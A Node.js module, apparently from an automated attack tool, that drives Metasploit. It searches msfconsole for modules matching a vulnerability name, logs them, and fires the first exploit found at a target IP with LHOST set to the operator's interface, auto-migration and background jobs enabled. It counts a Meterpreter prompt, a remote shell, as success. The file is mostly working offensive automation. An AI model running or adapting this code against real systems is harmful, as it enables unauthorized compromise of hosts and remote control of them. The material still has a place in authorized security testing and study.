const { spawn, exec } = require('child_process')
const {chunksToLinesAsync, chomp} = require('@rauschma/stringio');
const fs = require('fs')


let module_lists = [];
// Import modules

const main = require('../index')
const util = require('./spinnier')
const log = require('./log')


async function echoReadable(readable) {
    for await (const line of chunksToLinesAsync(readable)) { // (C)
        console.log(chomp(line));
    }
}

search_vuln = async (vuln) => {
    fs.writeFileSync('exploit.txt', '')
    util.spinner.add(vuln, {text: `Searching Metasploit for ${vuln}`, spinnerColor: 'redBright'})
    const msf = spawn('msfconsole', ['-q', '-x', `search ${vuln}`])
    
    const lines = chunksToLinesAsync(msf.stdout);
    for await (const line of lines) {
        if (line.includes('exploit/')) {
            const exploit1 = line.split('exploit/')[1]
            const exploit = exploit1.split(' ')[0]
            fs.appendFileSync('exploit.txt', line + '\n')
            await exploit_vuln(vuln, exploit)
            const module_path = line.split('exploit/')[1].split(' ')[0]
            fs.appendFile('modules.txt', 'exploit/'+ module_path + '\n', (err) => {
                if(err) {
                    log.error(err);
                }
            } )
            util.spinner.succeed(vuln, {text: `Found Exploit for ${vuln}`, succeedColor: 'greenBright'})
            return true
        } else if (line.includes('No results from search')) {
            util.spinner.succeed(vuln, {text: `No Exploit for ${vuln}`, succeedColor: 'redBright'})
            return false
        } else if (line.includes('auxiliary/')) {
            const exploit1 = line.split('auxiliary/')[1]
            const exploit = exploit1.split(' ')[0]
            fs.appendFileSync('exploit.txt', line + '\n')
            module_lists.push({vuln,exploit})
            util.spinner.succeed(vuln, {text: `Found Exploit for ${vuln}`, succeedColor: 'greenBright'})
            return true
        }

    }

    if (module_lists.length > 0) {
        list_modules()
    }
}

const list_modules = async () => {
    for (let i = 0; module_lists.length > i; i++) {
        console.log(module_lists[i])
    }
}

const unique_modules = async () => {
    const modules_file = fs.readFileSync('modules.txt', 'utf8')

    const modules = modules_file.split('\n')

    const unique_modules = [...new Set(modules)]

    fs.writeFileSync('modules.txt', '')

    for (let i = 0; unique_modules.length > i; i++) {
        fs.appendFile('modules.txt', unique_modules[i] + '\n', (err) => {
            if(err) {
                log.error(err);
            }
        } )
    }
}

exploit_vuln = async (vuln, exploit) => {
    util.spinner.add(vuln, {text: `Exploiting ${vuln}`, spinnerColor: 'redBright'})
    const msf = spawn('msfconsole', ['-q', '-x', `use exploit/${exploit}`,`set RHOSTS ${main.ip}`,`set LHOST ${main.local_interface}`, 'set autorunscript migrate -f', 'exploit -j'])

    const lines = chunksToLinesAsync(msf.stdout);
    for await (const line of lines) {
        if (line.includes('meterpreter>')) {
            util.spinner.succeed(vuln, {text: `Exploit Successful on ${vuln}`, succeedColor: 'greenBright'})
            console.log('job id: ' + line.split(' ')[2])
            return true
            
        } else if (line.includes('[-] Exploit failed')) {
            util.spinner.succeed(vuln, {text: `Exploit Failed on ${vuln}`, succeedColor: 'redBright'})
            return false
        }
    }

    msf.stdout.on('data', (data) => {
        console.log(data.toString())
    })

    msf.stderr.on('data', (data) => {
        console.log(data.toString())
    })

    
}


module.exports = { search_vuln, list_modules, unique_modules, exploit_vuln}